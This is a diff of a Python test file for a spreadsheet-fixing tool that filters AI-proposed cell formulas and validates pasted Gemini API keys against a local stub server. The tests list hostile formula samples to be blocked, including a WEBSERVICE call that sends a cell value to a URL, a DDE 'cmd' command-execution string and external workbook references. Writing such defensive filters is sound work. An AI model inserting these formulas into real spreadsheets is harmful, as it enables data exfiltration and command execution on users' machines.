@@ -135,17 +135,18 @@ def test_suggest_fix_drops_circular_formula(monkeypatch):
 def test_suggest_fix_drops_formulas_that_reach_outside_the_workbook(monkeypatch):
     bad = ['=WEBSERVICE("https://x/?"&A2)', '=IMAGE("https://x/a.png")', '=HYPERLINK("http://x","go")',
            "=[Other.xlsx]Sheet1!A1", "=FILTERXML(A1,\"//a\")", "=cmd|'/c calc'!A1", '+WEBSERVICE("https://x")',
-           ' @HYPERLINK("http://x")']
+           ' @HYPERLINK("http://x")', "='C:\\x\\[Book.xlsx]Sheet1'!A1"]
     wide = COLS + ["D", "E"]  # a table wide and long enough to hold every proposed cell
-    rows = [r + ["", ""] for r in ROWS] + [["2026-01-09", "East", 1, "", ""]] * 6
+    rows = [r + ["", ""] for r in ROWS] + [["2026-01-09", "East", 1, "", ""]] * 7
     answer = {"explanation": "x", "changes": [{"cell": f"D{k + 2}", "new": f} for k, f in enumerate(bad)]
-              + [{"cell": "E2", "new": "=AVERAGEIFS(C2:C3,B2:B3,\"East\")"}, {"cell": "E3", "new": "imaging"}]}
+              + [{"cell": "E2", "new": "=AVERAGEIFS(C2:C3,B2:B3,\"East\")"}, {"cell": "E3", "new": "imaging"},
+                 {"cell": "E4", "new": "=AVERAGE(Table1[Units])"}]}  # a table's own column: inside the workbook
     srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
     try:
         out = client.suggest_fix(wide, rows, 1, 0, 0, "", "")
     finally:
         srv.shutdown()
-    assert [c["cell"] for c in out["changes"]] == ["E2", "E3"]  # plain text values are never formulas
+    assert [c["cell"] for c in out["changes"]] == ["E2", "E3", "E4"]  # plain text values are never formulas
     assert "reached outside this workbook" in out["explanation"]
 
 
@@ -181,11 +182,20 @@ def test_suggest_fix_keeps_to_the_table(monkeypatch):  # a prompt-injected cell 
 
 # ---- free AI: a Google Gemini key pasted in the pane (no credit card), same safety checks on the answer ----
 
-def gemini_stub(monkeypatch, tmp_path, status=200, content=None, error=None):
+def gemini_stub(monkeypatch, tmp_path, status=200, content=None, error=None, models=("models/gemini-3.8-flash",)):
     """Local stand-in for Google's OpenAI-compatible endpoint. -> list of (headers, body) it received."""
     got = []
 
     class Stub(BaseHTTPRequestHandler):
+        def do_GET(self):  # the models list: how a pasted key is tested
+            got.append((dict(self.headers), None))
+            out = json.dumps({"error": {"message": error}} if status != 200 else {"data": [{"id": m} for m in models]}).encode()
+            self.send_response(status)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(out)))
+            self.end_headers()
+            self.wfile.write(out)
+
         def do_POST(self):
             got.append((dict(self.headers), json.loads(self.rfile.read(int(self.headers["Content-Length"])))))
             out = json.dumps({"error": {"message": error}} if error else {"choices": [{"message": {"content": content}}]}).encode()
@@ -211,13 +221,36 @@ def test_pasted_key_turns_on_free_ai_and_can_be_removed(monkeypatch, tmp_path):
     gemini_stub(monkeypatch, tmp_path)
     c = create_app().test_client()
     assert c.get("/health").get_json()["ai_available"] is False
-    assert c.post("/key", json={"key": "  AIzaTest_key-123 "}).get_json() == {"ai_available": True, "ai_provider": "gemini"}
+    assert c.post("/key", json={"key": "  AIzaTest_key-123 "}).get_json() == {
+        "ai_available": True, "ai_provider": "gemini", "message": "Key works. AI help is on."}
     assert (tmp_path / "gemini-key.txt").read_text() == "AIzaTest_key-123"
     assert c.get("/health").get_json()["ai_provider"] == "gemini"
     for bad in ({"key": "<script>"}, {"key": "a b"}, {"key": 5}, {}):
         assert c.post("/key", json=bad).status_code == 400, bad
+    for junk in ([1], "abc", 5):  # not even an object: a clear 400, not a crash
+        assert c.post("/key", json=junk).status_code == 400, junk
     assert c.post("/key", json={"key": ""}).get_json()["ai_available"] is False
     assert not (tmp_path / "gemini-key.txt").exists()
+
+
+def test_a_pasted_key_is_tested_with_google_before_it_is_kept(monkeypatch, tmp_path):
+    c = create_app().test_client()
+    gemini_stub(monkeypatch, tmp_path, status=400, error="API key not valid. Please pass a valid API key.")
+    r = c.post("/key", json={"key": "AIzaWrong"})
+    assert r.status_code == 400 and "did not accept this key" in r.get_json()["error"]
+    assert not (tmp_path / "gemini-key.txt").exists()  # a rejected key is not kept
+    gemini_stub(monkeypatch, tmp_path, models=("models/gemini-2.5-flash",))
+    assert "can't use gemini-3.8-flash" in c.post("/key", json={"key": "AIzaOld"}).get_json()["message"]
+    monkeypatch.setattr(client, "GEMINI_URL", "http://127.0.0.1:9/v1beta/openai/chat/completions")  # nothing listens
+    r = c.post("/key", json={"key": "AIzaOffline"}).get_json()
+    assert r["ai_available"] and "Couldn't reach Google" in r["message"]  # kept: Ask AI will say if it works
+
+
+def test_gemini_unknown_model_says_so(monkeypatch, tmp_path):
+    gemini_stub(monkeypatch, tmp_path, status=404, content="", error="models/gemini-3.8-flash is not found")
+    (tmp_path / "gemini-key.txt").write_text("AIzaTest")
+    r = post(BODY)
+    assert r.status_code == 502 and "doesn't offer" in r.get_json()["error"]
 
 
 def test_gemini_fix_goes_through_the_same_safety_checks(monkeypatch, tmp_path):
